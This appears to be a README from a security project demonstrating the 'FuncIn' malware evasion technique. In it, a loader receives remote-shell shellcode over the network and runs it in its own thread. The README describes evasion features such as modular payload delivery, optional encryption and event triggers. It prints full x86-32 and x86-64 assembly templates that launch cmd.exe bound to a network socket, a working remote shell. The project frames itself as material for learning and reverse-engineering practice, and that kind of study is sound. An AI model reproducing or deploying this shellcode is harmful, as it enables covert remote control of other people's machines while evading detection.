# FuncIn Unprotect Evasion Technique Demo

![Banner](Assets/banner.png)

## Description

This demonstration showcases the utilization of FuncIn evasion technique for spawning a remote shell. Instead of embedding the remote shell code directly within the loader, the entire remote shell function is transmitted over the network as a Just-In-Time (JIT) compiled shellcode. Subsequently, it is executed on a dedicated thread of the loader.

This project serves as a template for both practicing and comprehending how malware authors employ advanced techniques to create highly compact and optimized malware. Furthermore, these techniques introduce additional complexity to the reverse engineering process. Unlike conventional methods where the final payloads are directly embedded inside the loader or stored elsewhere (Ex: web server, third part file), this approach involves transmitting them over the network.

The modular nature of the malware, with the final payloads not being directly included in the loader, enhances its evasiveness. The transmitted payloads may also be optionally encrypted or obfuscated, adding an extra layer of defense against detection and analysis. Additionally, the malware may be configured to listen for specific events or behaviors before triggering the transmission of the payload.

## Video

![Video Demo](Assets/video.gif)

## Feature

* Remote Shell
* Support both x86-32 and x86-64 host process.
* Full interoperability between x86-32 Controller and x86-64 Loader and vis-versa.
* Designed to be easily extended in feature for practicing and learning purpose.

## Changelog

## 21 Dec 2023

* Python version of the controller added

## 15 Dec 2023

* x86-64 version of the FuncIn Shellcode implemented
* Few Improvements

## 13 Dec 2023

* Release (Delphi Loader & Controller)

## FuncIn Code Templates

### x86-32

```nasm
; @DarkCoderSc
mov ebp, esp
sub esp, 0x4
mov edx, <SizeOf(TStartupInfoA)>
sub esp, edx
mov edi, esp
mov ecx, edx
xor eax, eax
rep stosb
mov esi, <SocketFd>
mov dword ptr [esp], edx
mov dword ptr [esp + 0x2c], 0x101
mov word ptr [esp + 0x30], 0x0
mov dword ptr [esp + 0x38], esi
mov dword ptr [esp + 0x3c], esi
mov dword ptr [esp + 0x40], esi
mov esi, esp
sub esp, <SizeOf(TProcessInformation)>
mov [ebp-0x4], esp
push 0x00657865
push 0x2E646D63
mov edx, esp
xor eax, eax
push [ebp-0x4]
push esi
push eax
push eax
push 0x10
push 0x1
push eax
push eax
push edx
push eax
mov eax, <CreateProcessA>
call eax
xor eax, eax
dec eax
push eax
mov eax, [ebp-0x4]
push [eax]
mov eax, <WaitForSingleObject>
call eax
xor eax, eax
push eax
mov eax, <ExitThread>
call eax
```

### x86-64

```nasm
; @DarkCoderSc
mov r15, <SizeOf(TStartupInfoA)>
sub rsp, r15
mov rdi, rsp
mov rcx, r15
xor rax, rax
rep stosb
mov r14, <SocketFd>
mov qword ptr [rsp], r15
mov dword ptr [rsp + 0x3c], 0x101
mov word ptr [rsp + 0x40], 0x0
mov qword ptr [rsp + 0x50], r14
mov qword ptr [rsp + 0x58], r14
mov qword ptr [rsp + 0x60], r14
mov r14, rsp
sub rsp, <SizeOf(TProcessInformation)>
mov r15, rsp
mov rax, 0x006578652E646D63
push rax
mov r13, rsp
xor rax, rax
mov rcx, rax
mov rdx, r13
xor r8, r8
xor r9, r9
push r15
push r14
push rax
push rax
xor rbx, rbx
mov bl, 0x10
push rbx
inc rax
push rax
dec rax
push rax
push rax
push rax
push rax
mov rax, <CreateProcessA>
call rax
mov rcx, r15
mov rcx, [rcx]
xor rdx, rdx
dec rdx
mov rax, <WaitForSingleObject>
call rax
xor rcx, rcx
mov rax, <ExitThread>
call rax

```

## Greetings goes to

- [Keystone Engine](https://www.keystone-engine.org)

For their awesome open-source engine which facilitate shellcode development and maintenance.

## Disclaimer

🇺🇸 All source code and projects shared on this Github account by Unprotect are provided "as is" without warranty of any kind, either expressed or implied. The user of this code assumes all responsibility for any issues or legal liabilities that may arise from the use, misuse, or distribution of this code. The user of this code also agrees to release Unprotect from any and all liability for any damages or losses that may result from the use, misuse, or distribution of this code.

By using this code, the user agrees to indemnify and hold Unprotect harmless from any and all claims, liabilities, costs, and expenses arising from the use, misuse, or distribution of this code. The user also agrees not to hold Unprotect responsible for any errors or omissions in the code, and to take full responsibility for ensuring that the code meets the user's needs.

This disclaimer is subject to change without notice, and the user is responsible for checking for updates. If the user does not agree to the terms of this disclaimer, they should not use this code.

**Unprotect refers to the team dedicated to the maintenance and development of projects under the Unprotect umbrella.**
